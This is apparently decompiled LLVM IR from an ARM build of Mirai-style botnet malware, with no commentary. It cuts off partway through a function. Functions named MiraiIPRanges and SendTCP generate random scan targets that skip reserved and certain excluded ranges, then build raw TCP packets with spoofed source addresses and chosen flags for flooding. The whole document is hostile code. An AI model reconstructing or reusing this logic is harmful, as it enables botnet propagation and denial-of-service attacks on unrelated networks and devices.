dec_label_pc_126f0:                               ; preds = %dec_label_pc_126e4
  %v1_126fc = icmp slt i8 %stack_var_-27.0, 0
  br i1 %v1_126fc, label %dec_label_pc_12704, label %dec_label_pc_125a0

dec_label_pc_12704:                               ; preds = %dec_label_pc_126f0, %dec_label_pc_126d8, %dec_label_pc_126e4
  %v7_12708 = icmp eq i8 %stack_var_-28.0, 127
  br i1 %v7_12708, label %dec_label_pc_125a0, label %dec_label_pc_12710

dec_label_pc_12710:                               ; preds = %dec_label_pc_12704
  %v7_1281c = icmp eq i8 %stack_var_-28.0, 62
  %v4_12824 = zext i8 %stack_var_-27.0 to i32
  br i1 %v7_1281c, label %dec_label_pc_12824, label %dec_label_pc_12830

dec_label_pc_12824:                               ; preds = %dec_label_pc_12710
  %tmp49 = icmp ult i8 %stack_var_-27.0, 31
  br i1 %tmp49, label %dec_label_pc_125a0, label %dec_label_pc_12830

dec_label_pc_12830:                               ; preds = %dec_label_pc_12710, %dec_label_pc_12824
  %v7_12858 = icmp eq i8 %stack_var_-28.0, 65
  br i1 %v7_12858, label %dec_label_pc_12860, label %dec_label_pc_12878

dec_label_pc_12860:                               ; preds = %dec_label_pc_12830
  %tmp50 = icmp ult i8 %stack_var_-27.0, -32
  br i1 %tmp50, label %dec_label_pc_12878, label %dec_label_pc_1286c

dec_label_pc_1286c:                               ; preds = %dec_label_pc_12860
  %tmp51 = icmp ult i8 %stack_var_-26.0, -29
  br i1 %tmp51, label %dec_label_pc_125a0, label %dec_label_pc_12878

dec_label_pc_12878:                               ; preds = %dec_label_pc_12830, %dec_label_pc_1286c, %dec_label_pc_12860
  %v2_128cc = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_375a8.359 to i32), i32* @lr, align 4
  store i32 %v4_126c0, i32* @r4, align 4
  %v4_1291c = urem i32 %storemerge, 256
  %v6_12938 = sext i8 %stack_var_-26.0 to i32
  %v8_12938 = call i32 @szprintf(i32 %v2_128cc, i32 ptrtoint ([12 x i8]* @global_var_375a8.359 to i32), i32 %v4_126c0, i32 %v4_12824, i32 %v6_12938, i32 %v4_1291c)
  store i32 %v2_128cc, i32* @r0, align 4
  %v1_12944 = call i32 @inet_addr(i32 %v2_128cc)
  store i32 %v3_12468, i32* @r4, align 4
  store i32 %v6_12468, i32* @fp, align 4
  store i32 %v13_12468, i32* @lr, align 4
  ret i32 %v1_12944

; uselistorder directives
  uselistorder i32 %v2_128cc, { 2, 1, 0 }
  uselistorder i8 %stack_var_-28.0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i8 %stack_var_-27.0, { 2, 1, 4, 3, 0 }
  uselistorder i8 %stack_var_-26.0, { 1, 0 }
  uselistorder i32 %v0_12630, { 1, 0 }
  uselistorder i32 %v0_125e8, { 1, 0 }
  uselistorder i32 %v0_125a0, { 1, 0 }
  uselistorder i32 %v0_1250c, { 1, 0 }
  uselistorder i32 %v0_124c4, { 1, 0 }
  uselistorder i32 %v0_1247c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_12878, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12830, { 1, 0 }
  uselistorder label %dec_label_pc_12704, { 0, 2, 1 }
  uselistorder label %dec_label_pc_126c0, { 1, 0 }
  uselistorder label %dec_label_pc_125a0, { 1, 2, 3, 0, 4, 5 }
}

define i32 @"$d.15"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1295c:
  %v0_1295c = load i1, i1* @cpsr_z, align 1
  %v1_1295c = load i1, i1* @cpsr_c, align 1
  %v2_1295c = xor i1 %v1_1295c, true
  %v3_1295c = or i1 %v0_1295c, %v2_1295c
  br i1 %v3_1295c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_1295c
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_1295c, %bb
  %v2_12960 = xor i1 %v0_1295c, true
  %v3_12960 = and i1 %v1_1295c, %v2_12960
  br i1 %v3_12960, label %bb3, label %bb4

bb3:                                              ; preds = %bb2
  br i1 %v0_1295c, label %bb5, label %bb6

bb4:                                              ; preds = %bb2
  br i1 %v0_1295c, label %._crit_edge, label %bb6

._crit_edge:                                      ; preds = %bb4
  br label %bb5

bb5:                                              ; preds = %._crit_edge, %bb3
  br label %bb6

bb6:                                              ; preds = %bb3, %bb4, %bb5
  ret i32 %arg1

; uselistorder directives
  uselistorder i1 %v1_1295c, { 1, 0 }
  uselistorder i1 %v0_1295c, { 2, 1, 0, 3 }
  uselistorder label %bb6, { 2, 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @MiraiIPRanges(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_1296c = load i32, i32* @r4, align 4
  %v6_1296c = load i32, i32* @fp, align 4
  %v13_1296c = load i32, i32* @lr, align 4
  store i32 76148, i32* %stack_var_-4, align 4
  %v2_12970 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12970, i32* @fp, align 4
  %v0_12978 = call i32 @rand()
  %v2_12994 = sdiv i32 %v0_12978, 49
  %tmp27 = mul i32 %v2_12994, -223
  %v2_129b4 = add i32 %tmp27, %v0_12978
  %v1_129c8 = trunc i32 %v2_129b4 to i8
  store i8 %v1_129c8, i8* bitcast (i8** @global_var_49f50.585 to i8*), align 4
  %v0_129cc = call i32 @rand()
  %v2_129e8 = sdiv i32 %v0_129cc, 51
  %tmp28 = mul i32 %v2_129e8, -255
  %v2_12a00 = add i32 %tmp28, %v0_129cc
  %v1_12a14 = trunc i32 %v2_12a00 to i8
  store i8 %v1_12a14, i8* @global_var_49f51.587, align 1
  %v0_12a18 = call i32 @rand()
  %v2_12a34 = sdiv i32 %v0_12a18, 51
  %tmp29 = mul i32 %v2_12a34, -255
  %v2_12a4c = add i32 %tmp29, %v0_12a18
  %v1_12a60 = trunc i32 %v2_12a4c to i8
  store i8 %v1_12a60, i8* @global_var_49f52.588, align 1
  %v0_12a64 = call i32 @rand()
  %v2_12a80 = sdiv i32 %v0_12a64, 51
  %tmp = mul i32 %v2_12a80, -255
  %v2_12a98 = add i32 %v0_12a64, %tmp
  %extract.t = trunc i32 %v2_12a98 to i8
  br label %dec_label_pc_12bec

dec_label_pc_12ab4:                               ; preds = %dec_label_pc_12dfc, %dec_label_pc_12dec, %dec_label_pc_12ddc, %dec_label_pc_12dcc, %dec_label_pc_12dbc, %dec_label_pc_12dac, %dec_label_pc_12d9c, %dec_label_pc_12d8c, %dec_label_pc_12d7c, %dec_label_pc_12d6c, %dec_label_pc_12d5c, %dec_label_pc_12d4c, %dec_label_pc_12d3c, %dec_label_pc_12d2c, %dec_label_pc_12d1c, %dec_label_pc_12cec, %dec_label_pc_12ccc, %dec_label_pc_12c9c, %dec_label_pc_12c6c, %dec_label_pc_12c4c, %dec_label_pc_12c3c, %dec_label_pc_12c2c, %dec_label_pc_12c1c, %dec_label_pc_12c0c, %dec_label_pc_12bfc, %dec_label_pc_12bec
  %v0_12ab4 = call i32 @rand()
  %v2_12ad0 = sdiv i32 %v0_12ab4, 49
  %tmp30 = mul i32 %v2_12ad0, -223
  %v2_12af0 = add i32 %tmp30, %v0_12ab4
  %v1_12b04 = trunc i32 %v2_12af0 to i8
  store i8 %v1_12b04, i8* bitcast (i8** @global_var_49f50.585 to i8*), align 4
  %v0_12b08 = call i32 @rand()
  %v2_12b24 = sdiv i32 %v0_12b08, 51
  %tmp31 = mul i32 %v2_12b24, -255
  %v2_12b3c = add i32 %tmp31, %v0_12b08
  %v1_12b50 = trunc i32 %v2_12b3c to i8
  store i8 %v1_12b50, i8* @global_var_49f51.587, align 1
  %v0_12b54 = call i32 @rand()
  %v2_12b70 = sdiv i32 %v0_12b54, 51
  %tmp32 = mul i32 %v2_12b70, -255
  %v2_12b88 = add i32 %tmp32, %v0_12b54
  %v1_12b9c = trunc i32 %v2_12b88 to i8
  store i8 %v1_12b9c, i8* @global_var_49f52.588, align 1
  %v0_12ba0 = call i32 @rand()
  %v2_12bbc = sdiv i32 %v0_12ba0, 51
  %tmp39 = mul i32 %v2_12bbc, -255
  %v2_12bd4 = add i32 %v0_12ba0, %tmp39
  %extract.t38 = trunc i32 %v2_12bd4 to i8
  br label %dec_label_pc_12bec

dec_label_pc_12bec:                               ; preds = %entry, %dec_label_pc_12ab4
  %v2_12a98.sink.off0 = phi i8 [ %extract.t, %entry ], [ %extract.t38, %dec_label_pc_12ab4 ]
  store i8 %v2_12a98.sink.off0, i8* @global_var_49f53.589, align 1
  %v2_12bf0 = load i8, i8* bitcast (i8** @global_var_49f50.585 to i8*), align 4
  %v3_12bf0 = zext i8 %v2_12bf0 to i32
  %v7_12bf4 = icmp eq i8 %v2_12bf0, 127
  br i1 %v7_12bf4, label %dec_label_pc_12ab4, label %dec_label_pc_12bfc

dec_label_pc_12bfc:                               ; preds = %dec_label_pc_12bec
  %v2_12c04 = icmp eq i8 %v2_12bf0, 0
  br i1 %v2_12c04, label %dec_label_pc_12ab4, label %dec_label_pc_12c0c

dec_label_pc_12c0c:                               ; preds = %dec_label_pc_12bfc
  %v7_12c14 = icmp eq i8 %v2_12bf0, 3
  br i1 %v7_12c14, label %dec_label_pc_12ab4, label %dec_label_pc_12c1c

dec_label_pc_12c1c:                               ; preds = %dec_label_pc_12c0c
  %v7_12c24 = icmp eq i8 %v2_12bf0, 15
  br i1 %v7_12c24, label %dec_label_pc_12ab4, label %dec_label_pc_12c2c

dec_label_pc_12c2c:                               ; preds = %dec_label_pc_12c1c
  %v7_12c34 = icmp eq i8 %v2_12bf0, 16
  br i1 %v7_12c34, label %dec_label_pc_12ab4, label %dec_label_pc_12c3c

dec_label_pc_12c3c:                               ; preds = %dec_label_pc_12c2c
  %v7_12c44 = icmp eq i8 %v2_12bf0, 56
  br i1 %v7_12c44, label %dec_label_pc_12ab4, label %dec_label_pc_12c4c

dec_label_pc_12c4c:                               ; preds = %dec_label_pc_12c3c
  %v7_12c54 = icmp eq i8 %v2_12bf0, 10
  br i1 %v7_12c54, label %dec_label_pc_12ab4, label %dec_label_pc_12c5c

dec_label_pc_12c5c:                               ; preds = %dec_label_pc_12c4c
  %v7_12c64 = icmp eq i8 %v2_12bf0, -64
  br i1 %v7_12c64, label %dec_label_pc_12c6c, label %dec_label_pc_12c7c

dec_label_pc_12c6c:                               ; preds = %dec_label_pc_12c5c
  %v3_12c70 = load i8, i8* @global_var_49f51.587, align 1
  %v7_12c74 = icmp eq i8 %v3_12c70, -88
  br i1 %v7_12c74, label %dec_label_pc_12ab4, label %dec_label_pc_12c7c

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_12c5c, %dec_label_pc_12c6c
  %v7_12c84 = icmp eq i8 %v2_12bf0, -84
  br i1 %v7_12c84, label %dec_label_pc_12c8c, label %dec_label_pc_12cac

dec_label_pc_12c8c:                               ; preds = %dec_label_pc_12c7c
  %v3_12c90 = load i8, i8* @global_var_49f51.587, align 1
  %tmp40 = icmp ult i8 %v3_12c90, 16
  br i1 %tmp40, label %dec_label_pc_12cac, label %dec_label_pc_12c9c

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12c8c
  %tmp41 = icmp ult i8 %v3_12c90, 32
  br i1 %tmp41, label %dec_label_pc_12ab4, label %dec_label_pc_12cac

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12c7c, %dec_label_pc_12c9c, %dec_label_pc_12c8c
  %v7_12cb4 = icmp eq i8 %v2_12bf0, 100
  br i1 %v7_12cb4, label %dec_label_pc_12cbc, label %dec_label_pc_12cdc

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12cac
  %v3_12cc0 = load i8, i8* @global_var_49f51.587, align 1
  %tmp42 = icmp ult i8 %v3_12cc0, 64
  br i1 %tmp42, label %dec_label_pc_12cdc, label %dec_label_pc_12ccc

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12cbc
  %tmp43 = icmp ult i8 %v3_12cc0, 127
  br i1 %tmp43, label %dec_label_pc_12ab4, label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12cac, %dec_label_pc_12ccc, %dec_label_pc_12cbc
  %v7_12ce4 = icmp eq i8 %v2_12bf0, -87
  br i1 %v7_12ce4, label %dec_label_pc_12cec, label %dec_label_pc_12cfc

dec_label_pc_12cec:                               ; preds = %dec_label_pc_12cdc
  %v3_12cf0 = load i8, i8* @global_var_49f51.587, align 1
  %v2_12cf4 = icmp eq i8 %v3_12cf0, -1
  br i1 %v2_12cf4, label %dec_label_pc_12ab4, label %dec_label_pc_12cfc

dec_label_pc_12cfc:                               ; preds = %dec_label_pc_12cdc, %dec_label_pc_12cec
  %v7_12d04 = icmp eq i8 %v2_12bf0, -58
  br i1 %v7_12d04, label %dec_label_pc_12d0c, label %dec_label_pc_12d2c

dec_label_pc_12d0c:                               ; preds = %dec_label_pc_12cfc
  %v3_12d10 = load i8, i8* @global_var_49f51.587, align 1
  %tmp44 = icmp ult i8 %v3_12d10, 18
  br i1 %tmp44, label %dec_label_pc_12d2c, label %dec_label_pc_12d1c

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12d0c
  %tmp45 = or i8 %v3_12d10, 1
  %tmp46 = icmp eq i8 %tmp45, 19
  br i1 %tmp46, label %dec_label_pc_12ab4, label %dec_label_pc_12d2c

dec_label_pc_12d2c:                               ; preds = %dec_label_pc_12cfc, %dec_label_pc_12d1c, %dec_label_pc_12d0c
  %v7_12d34 = icmp eq i8 %v2_12bf0, -32
  br i1 %v7_12d34, label %dec_label_pc_12ab4, label %dec_label_pc_12d3c

dec_label_pc_12d3c:                               ; preds = %dec_label_pc_12d2c
  %v7_12d44 = icmp eq i8 %v2_12bf0, 6
  br i1 %v7_12d44, label %dec_label_pc_12ab4, label %dec_label_pc_12d4c

dec_label_pc_12d4c:                               ; preds = %dec_label_pc_12d3c
  %v7_12d54 = icmp eq i8 %v2_12bf0, 7
  br i1 %v7_12d54, label %dec_label_pc_12ab4, label %dec_label_pc_12d5c

dec_label_pc_12d5c:                               ; preds = %dec_label_pc_12d4c
  %v7_12d64 = icmp eq i8 %v2_12bf0, 11
  br i1 %v7_12d64, label %dec_label_pc_12ab4, label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %dec_label_pc_12d5c
  %v7_12d74 = icmp eq i8 %v2_12bf0, 21
  br i1 %v7_12d74, label %dec_label_pc_12ab4, label %dec_label_pc_12d7c

dec_label_pc_12d7c:                               ; preds = %dec_label_pc_12d6c
  %v7_12d84 = icmp eq i8 %v2_12bf0, 22
  br i1 %v7_12d84, label %dec_label_pc_12ab4, label %dec_label_pc_12d8c

dec_label_pc_12d8c:                               ; preds = %dec_label_pc_12d7c
  %v7_12d94 = icmp eq i8 %v2_12bf0, 26
  br i1 %v7_12d94, label %dec_label_pc_12ab4, label %dec_label_pc_12d9c

dec_label_pc_12d9c:                               ; preds = %dec_label_pc_12d8c
  %v7_12da4 = icmp eq i8 %v2_12bf0, 28
  br i1 %v7_12da4, label %dec_label_pc_12ab4, label %dec_label_pc_12dac

dec_label_pc_12dac:                               ; preds = %dec_label_pc_12d9c
  %v7_12db4 = icmp eq i8 %v2_12bf0, 29
  br i1 %v7_12db4, label %dec_label_pc_12ab4, label %dec_label_pc_12dbc

dec_label_pc_12dbc:                               ; preds = %dec_label_pc_12dac
  %v7_12dc4 = icmp eq i8 %v2_12bf0, 30
  br i1 %v7_12dc4, label %dec_label_pc_12ab4, label %dec_label_pc_12dcc

dec_label_pc_12dcc:                               ; preds = %dec_label_pc_12dbc
  %v7_12dd4 = icmp eq i8 %v2_12bf0, 33
  br i1 %v7_12dd4, label %dec_label_pc_12ab4, label %dec_label_pc_12ddc

dec_label_pc_12ddc:                               ; preds = %dec_label_pc_12dcc
  %v7_12de4 = icmp eq i8 %v2_12bf0, 55
  br i1 %v7_12de4, label %dec_label_pc_12ab4, label %dec_label_pc_12dec

dec_label_pc_12dec:                               ; preds = %dec_label_pc_12ddc
  %v7_12df4 = icmp eq i8 %v2_12bf0, -42
  br i1 %v7_12df4, label %dec_label_pc_12ab4, label %dec_label_pc_12dfc

dec_label_pc_12dfc:                               ; preds = %dec_label_pc_12dec
  %v7_12e04 = icmp eq i8 %v2_12bf0, -41
  br i1 %v7_12e04, label %dec_label_pc_12ab4, label %dec_label_pc_12e0c

dec_label_pc_12e0c:                               ; preds = %dec_label_pc_12dfc
  %v2_12e0c = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 %v3_12bf0, i32* @lr, align 4
  %v3_12e54 = load i8, i8* @global_var_49f51.587, align 1
  %v4_12e54 = zext i8 %v3_12e54 to i32
  store i32 %v4_12e54, i32* @r4, align 4
  %v3_12e60 = load i8, i8* @global_var_49f52.588, align 1
  %v6_12e88 = sext i8 %v3_12e54 to i32
  %v8_12e88 = sext i8 %v3_12e60 to i32
  %v10_12e88 = sext i8 %v2_12a98.sink.off0 to i32
  %v11_12e88 = call i32 @szprintf(i32 %v2_12e0c, i32 ptrtoint ([12 x i8]* @global_var_375a8.359 to i32), i32 %v3_12bf0, i32 %v6_12e88, i32 %v8_12e88, i32 %v10_12e88)
  store i32 %v2_12e0c, i32* @r0, align 4
  %v1_12e94 = call i32 @inet_addr(i32 %v2_12e0c)
  store i32 %v3_1296c, i32* @r4, align 4
  store i32 %v6_1296c, i32* @fp, align 4
  store i32 %v13_1296c, i32* @lr, align 4
  ret i32 %v1_12e94

; uselistorder directives
  uselistorder i32 %v2_12e0c, { 2, 1, 0 }
  uselistorder i32 %v0_12b54, { 1, 0 }
  uselistorder i32 %v0_12b08, { 1, 0 }
  uselistorder i32 %v0_12ab4, { 1, 0 }
  uselistorder i32 %v0_12a18, { 1, 0 }
  uselistorder i32 %v0_129cc, { 1, 0 }
  uselistorder i32 %v0_12978, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ptrtoint ([12 x i8]* @global_var_375a8.359 to i32), { 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i8 -32, { 1, 0 }
  uselistorder i8 -64, { 1, 0 }
  uselistorder i8* @global_var_49f52.588, { 2, 1, 0 }
  uselistorder i8* @global_var_49f51.587, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 51, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13 }
  uselistorder i8* bitcast (i8** @global_var_49f50.585 to i8*), { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d2c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12cfc, { 1, 0 }
  uselistorder label %dec_label_pc_12cdc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12cac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12c7c, { 1, 0 }
  uselistorder label %dec_label_pc_12bec, { 1, 0 }
}

define i32 @SendTCP(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_12ec0 = load i32, i32* @r4, align 4
  %v6_12ec0 = load i32, i32* @fp, align 4
  store i32 77512, i32* %stack_var_-4, align 4
  %v2_12ec4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12ec4, i32* @fp, align 4
  %v0_12ed8 = call i32 @listFork()
  %v2_12ee0 = icmp eq i32 %v0_12ed8, 0
  br i1 %v2_12ee0, label %dec_label_pc_12eec, label %dec_label_pc_13700

dec_label_pc_12eec:                               ; preds = %entry
  %v2_12ef8 = load i32, i32* %arg1, align 4
  %v1_12f04 = add i32 %tmp, 4
  %v2_12f04 = inttoptr i32 %v1_12f04 to i32*
  %v3_12f04 = load i32, i32* %v2_12f04, align 4
  %v1_12f10 = add i32 %tmp, 8
  %v2_12f10 = inttoptr i32 %v1_12f10 to i32*
  %v3_12f10 = load i32, i32* %v2_12f10, align 4
  %v1_12f1c = add i32 %tmp, 12
  %v2_12f1c = inttoptr i32 %v1_12f1c to i32*
  %v3_12f1c = load i32, i32* %v2_12f1c, align 4
  %v1_12f28 = add i32 %tmp, 16
  %v2_12f28 = inttoptr i32 %v1_12f28 to i32*
  %v3_12f28 = load i32, i32* %v2_12f28, align 4
  %v1_12f34 = add i32 %tmp, 20
  %v2_12f34 = inttoptr i32 %v1_12f34 to i32*
  %v3_12f34 = load i32, i32* %v2_12f34, align 4
  %v1_12f40 = add i32 %tmp, 24
  %v2_12f40 = inttoptr i32 %v1_12f40 to i32*
  %v3_12f40 = load i32, i32* %v2_12f40, align 4
  store i32 2, i32* %stack_var_-100, align 4
  %v2_12f5c = icmp eq i32 %v3_12f04, 0
  br i1 %v2_12f5c, label %dec_label_pc_12f64, label %dec_label_pc_12f7c

dec_label_pc_12f64:                               ; preds = %dec_label_pc_12eec
  %v0_12f64 = call i32 @rand_cmwc()
  br label %dec_label_pc_12f98

dec_label_pc_12f7c:                               ; preds = %dec_label_pc_12eec
  %v3_12f84 = urem i32 %v3_12f04, 65536
  %v1_12f8c = call i32 @__GI_htons(i32 %v3_12f84)
  br label %dec_label_pc_12f98

dec_label_pc_12f98:                               ; preds = %dec_label_pc_12f64, %dec_label_pc_12f7c
  %v3_12fa8 = call i32 @getHost(i32 %v2_12ef8, i32* nonnull %stack_var_-96)
  %v2_12fb0 = icmp eq i32 %v3_12fa8, 0
  br i1 %v2_12fb0, label %dec_label_pc_12fbc, label %dec_label_pc_13700

dec_label_pc_12fbc:                               ; preds = %dec_label_pc_12f98
  %v2_12fc0 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_12fc0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_12fd0 = call i32 @__GI_memset()
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_12fe0 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_12ff0 = icmp eq i32 %v3_12fe0, 0
  br i1 %v2_12ff0, label %dec_label_pc_13700, label %dec_label_pc_12ffc

dec_label_pc_12ffc:                               ; preds = %dec_label_pc_12fbc
  store i32 1, i32* %stack_var_-104, align 4
  %v2_13004 = ptrtoint i32* %stack_var_-104 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_13020 = call i32 @__GI_setsockopt(i32 %v3_12fe0, i32 0, i32 3, i32 %v2_13004, i32 4)
  %v1_13028 = icmp slt i32 %v5_13020, 0
  br i1 %v1_13028, label %dec_label_pc_13700, label %dec_label_pc_13034

dec_label_pc_13034:                               ; preds = %dec_label_pc_12ffc
  %v2_13038 = icmp eq i32 %v3_12f40, 0
  br i1 %v2_13038, label %dec_label_pc_13064, label %dec_label_pc_1304c

dec_label_pc_1304c:                               ; preds = %dec_label_pc_13034
  %v1_13050 = sub i32 32, %v3_12f40
  store i32 %v1_13050, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13064

dec_label_pc_13064:                               ; preds = %dec_label_pc_13034, %dec_label_pc_1304c
  %v1_13068 = add i32 %v3_12f28, 40
  %v1_13078 = add i32 %v3_12f28, 54
  %v3_1307c = and i32 %v1_13078, -8
  %v1_13084 = load i32, i32* @sp, align 4
  %v2_13084 = sub i32 %v1_13084, %v3_1307c
  %v1_13094 = add i32 %v2_13084, 15
  %v3_13098 = and i32 %v1_13094, -8
  store i32 %v3_13098, i32* %r2.global-to-local, align 4
  %v1_130b8 = add i32 %v3_13098, 20
  %v5_130bc = inttoptr i32 %v1_130b8 to i16*
  %v3_130c0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_130c0, i32* @r4, align 4
  %v0_130c4 = call i32 @getspoof()
  %v1_130d0 = call i32 @__GI_htonl(i32 %v0_130c4)
  store i32 %v1_130d0, i32* %r2.global-to-local, align 4
  %v1_130dc = add i32 %v3_12f28, 20
  %v1_130e0 = load i32, i32* @sp, align 4
  %v2_130e0 = inttoptr i32 %v1_130e0 to i32*
  store i32 %v1_130dc, i32* %v2_130e0, align 4
  %v0_130e8 = load i32, i32* @r4, align 4
  %v4_130f0 = inttoptr i32 %v3_13098 to i8*
  %v5_130f0 = call i32 @makeIPPacket(i8* %v4_130f0, i32 %v0_130e8, i32 %v1_130d0, i32 6)
  %v0_130f4 = call i32 @rand_cmwc()
  %v3_13100 = urem i32 %v0_130f4, 65536
  store i32 %v3_13100, i32* %r2.global-to-local, align 4
  %v1_13108 = trunc i32 %v0_130f4 to i16
  store i16 %v1_13108, i16* %v5_130bc, align 4
  %v0_1310c = call i32 @rand_cmwc()
  %v2_13118 = add i32 %v3_13098, 24
  %v3_13118 = inttoptr i32 %v2_13118 to i32*
  store i32 %v0_1310c, i32* %v3_13118, align 8
  %v2_13124 = add i32 %v3_13098, 28
  %v3_13124 = inttoptr i32 %v2_13124 to i32*
  store i32 0, i32* %v3_13124, align 4
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v1_1312c = add i32 %v3_13098, 32
  %v2_1312c = inttoptr i32 %v1_1312c to i8*
  %v3_1312c = load i8, i8* %v2_1312c, align 8
  %v1_13138 = urem i8 %v3_1312c, 16
  %v1_1313c = or i8 %v1_13138, 80
  store i8 %v1_1313c, i8* %v2_1312c, align 8
  store i32 ptrtoint ([4 x i8]* @global_var_37bb8.456 to i32), i32* @r1, align 4
  %v3_13158 = inttoptr i32 %v3_12f1c to i8*
  %v4_13158 = call i32 @__GI_strcoll(i8* %v3_13158, i32 ptrtoint ([4 x i8]* @global_var_37bb8.456 to i32))
  %v2_13160 = icmp eq i32 %v4_13158, 0
  br i1 %v2_13160, label %dec_label_pc_13168, label %dec_label_pc_13244

dec_label_pc_13168:                               ; preds = %dec_label_pc_13064
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v1_1316c = add i32 %v3_13098, 33
  %v2_1316c = inttoptr i32 %v1_1316c to i8*
  %v3_1316c = load i8, i8* %v2_1316c, align 1
  %v1_1317c = or i8 %v3_1316c, 2
  store i8 %v1_1317c, i8* %v2_1316c, align 1
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v3_13190 = load i8, i8* %v2_1316c, align 1
  %v1_131a0 = or i8 %v3_13190, 4
  store i8 %v1_131a0, i8* %v2_1316c, align 1
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v3_131b4 = load i8, i8* %v2_1316c, align 1
  %v1_131c4 = or i8 %v3_131b4, 1
  store i8 %v1_131c4, i8* %v2_1316c, align 1
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v3_131d8 = load i8, i8* %v2_1316c, align 1
  %v1_131e8 = or i8 %v3_131d8, 16
  store i8 %v1_131e8, i8* %v2_1316c, align 1
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v3_131fc = load i8, i8* %v2_1316c, align 1
  %v1_1320c = or i8 %v3_131fc, 8
  store i8 %v1_1320c, i8* %v2_1316c, align 1
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v3_13220 = load i8, i8* %v2_1316c, align 1
  %v1_13230 = or i8 %v3_13220, 32
  store i8 %v1_13230, i8* %v2_1316c, align 1
  br label %dec_label_pc_13508

dec_label_pc_13244:                               ; preds = %dec_label_pc_13064
  store i32 ptrtoint ([5 x i8]* @global_var_37bbc.458 to i32), i32* @r1, align 4
  %v4_13250 = call i32 @__GI_strcoll(i8* %v3_13158, i32 ptrtoint ([5 x i8]* @global_var_37bbc.458 to i32))
  %v2_13258 = icmp eq i32 %v4_13250, 0
  br i1 %v2_13258, label %dec_label_pc_13260, label %dec_label_pc_132d0

dec_label_pc_13260:                               ; preds = %dec_label_pc_13244
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v1_13264 = add i32 %v3_13098, 33
  %v2_13264 = inttoptr i32 %v1_13264 to i8*
  %v3_13264 = load i8, i8* %v2_13264, align 1
  %v1_13274 = or i8 %v3_13264, 1
  store i8 %v1_13274, i8* %v2_13264, align 1
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v3_13288 = load i8, i8* %v2_13264, align 1
  %v1_13298 = or i8 %v3_13288, 8
  store i8 %v1_13298, i8* %v2_13264, align 1
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v3_132ac = load i8, i8* %v2_13264, align 1
  %v1_132bc = or i8 %v3_132ac, 32
  store i8 %v1_132bc, i8* %v2_13264, align 1
  br label %dec_label_pc_13508

dec_label_pc_132d0:                               ; preds = %dec_label_pc_13244
  store i32 ptrtoint ([5 x i8]* @global_var_37bc4.460 to i32), i32* @r1, align 4
  %v4_132dc = call i32 @__GI_strcoll(i8* %v3_13158, i32 ptrtoint ([5 x i8]* @global_var_37bc4.460 to i32))
  %v2_132e4 = icmp eq i32 %v4_132dc, 0
  br i1 %v2_132e4, label %dec_label_pc_132ec, label %dec_label_pc_13338

dec_label_pc_132ec:                               ; preds = %dec_label_pc_132d0
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v1_132f0 = add i32 %v3_13098, 33
  %v2_132f0 = inttoptr i32 %v1_132f0 to i8*
  %v3_132f0 = load i8, i8* %v2_132f0, align 1
  %v1_13300 = or i8 %v3_132f0, 2
  store i8 %v1_13300, i8* %v2_132f0, align 1
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
